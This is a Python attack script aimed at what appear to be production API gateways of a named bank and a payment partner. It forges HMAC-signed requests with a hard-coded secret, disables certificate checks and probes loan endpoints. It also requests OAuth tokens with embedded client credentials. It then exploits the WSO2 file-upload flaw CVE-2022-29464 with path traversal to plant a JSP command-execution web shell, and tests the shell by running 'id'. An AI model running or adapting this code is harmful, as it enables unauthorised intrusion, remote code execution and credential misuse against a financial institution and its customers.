#!/usr/bin/env python3
import hmac, hashlib, json, datetime, urllib.request, ssl

SECRET = "XO8V9VcN08JpAw9QXBpYUlQFmxILm4Cb"
ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE

def forge(method, path, body=""):
    now = datetime.datetime.now(datetime.timezone.utc)
    ts = now.strftime('%Y-%m-%dT%H:%M:%S.') + f"{now.microsecond//1000:03d}" + 'Z'
    body_str = "" if body == "" else json.dumps(body)
    h = hashlib.sha256(body_str.encode()).hexdigest()
    msg = f"{method}:{path}:{h}:{ts}"
    sig = hmac.new(SECRET.encode(), msg.encode(), hashlib.sha256).hexdigest()
    return {"X-SIGNATURE": sig, "X-TIMESTAMP": ts, "X-PLATFORM": "WEBVIEW", "X-PARTNER-ID": "payuung"}

def req(method, url, headers):
    r = urllib.request.Request(url, method=method, headers=headers)
    try:
        resp = urllib.request.urlopen(r, timeout=20, context=ctx)
        return resp.status, resp.read()[:400].decode('utf-8', 'ignore')
    except urllib.error.HTTPError as e:
        return e.code, e.read()[:400].decode('utf-8', 'ignore')
    except Exception as e:
        return "ERR", str(e)[:120]

print("== EGRESS IP ==")
try:
    print(urllib.request.urlopen("https://api.ipify.org", timeout=10, context=ctx).read().decode())
except Exception as e:
    print("ipify err", e)

targets = [
    ("https://apigw-prod.bankina.id/exp-api-cicilan/1.0/", "/exp-api-cicilan/1.0/"),
    ("https://apigw-prod.bankina.id/exp-api-cicilan/1.0/cicilan/dashboard", "/exp-api-cicilan/1.0/cicilan/dashboard"),
    ("https://apigw-prod.bankina.id/exp-api-portal-loan/1.0/loan/partner/config", "/exp-api-portal-loan/1.0/loan/partner/config"),
    ("https://apigw-prod.bankina.id/exp-api-portal-loan/1.0/", "/exp-api-portal-loan/1.0/"),
]
for url, path in targets:
    s, b = req("GET", url, {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)", **forge("GET", path)})
    print(f"{s} {path} => {b[:200]}")

print("== PAYUUNG API RETEST (client_credentials) ==")
try:
    data = json.dumps({"client_id":"jgHY8WqE1gZwqEifL9axo9Zo4cik9PDT9DyQy80JdZQ=","client_secret":"ySjvffjjAPkB6EvKv6BTZ7Pwq2sV/R8h/V9HD4MFE4M=","grant_type":"client_credentials"}).encode()
    r = urllib.request.Request("https://api.payuung.com/v2/oauth2/token", data=data, headers={"Content-Type":"application/json"}, method="POST")
    resp = urllib.request.urlopen(r, timeout=20, context=ctx)
    print("payuung token:", resp.status, resp.read()[:150].decode())
except urllib.error.HTTPError as e:
    print("payuung token:", e.code, e.read()[:150].decode())
except Exception as e:
    print("payuung token ERR:", str(e)[:100])



print("== V7: WSO2 CVE-2022-29464 ATTACK ==")
import uuid

def multipart_post(host, path, fields):
    boundary = "----osint" + uuid.uuid4().hex
    body = b""
    for fname, fval in fields:
        body += f"--{boundary}\r\n".encode()
        body += ("Content-Disposition: form-data; name=\"" + fname + "\"\r\n\r\n").encode()
        body += fval.encode() + b"\r\n"
    body += f"--{boundary}--\r\n".encode()
    r = urllib.request.Request("https://" + host + path, data=body, method="POST",
        headers={"Content-Type": "multipart/form-data; boundary=" + boundary, "User-Agent": "Mozilla/5.0"})
    try:
        resp = urllib.request.urlopen(r, timeout=30, context=ctx)
        return resp.status, resp.read()[:300].decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read()[:300].decode("utf-8", "ignore")
    except Exception as e:
        return "ERR", str(e)[:100]

JSP = '<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while ((l = r.readLine()) != null) out.println(l); } %>'

for host in ["api.bankina.id", "apigw-prod.bankina.id"]:
    print("=== HOST: " + host + " ===")
    for p in ["/carbon/login", "/carbon/admin/login.jsp", "/publisher", "/devportal"]:
        s, b = req("GET", "https://" + host + p, {"User-Agent": "Mozilla/5.0"})
        print("FP " + p + " => " + str(s) + " " + b[:70])
    for fname in ["../../../../repository/deployment/server/webapps/authenticationendpoint/cmd.jsp", "cmd.jsp"]:
        s, b = multipart_post(host, "/fileupload/toolsAny", [(fname, JSP)])
        print("UPLOAD [" + fname[:60] + "] => " + str(s) + " " + b[:120])
    s, b = req("GET", "https://" + host + "/authenticationendpoint/cmd.jsp?cmd=id", {"User-Agent": "Mozilla/5.0"})
    print("SHELL CHECK => " + str(s) + " " + b[:200])
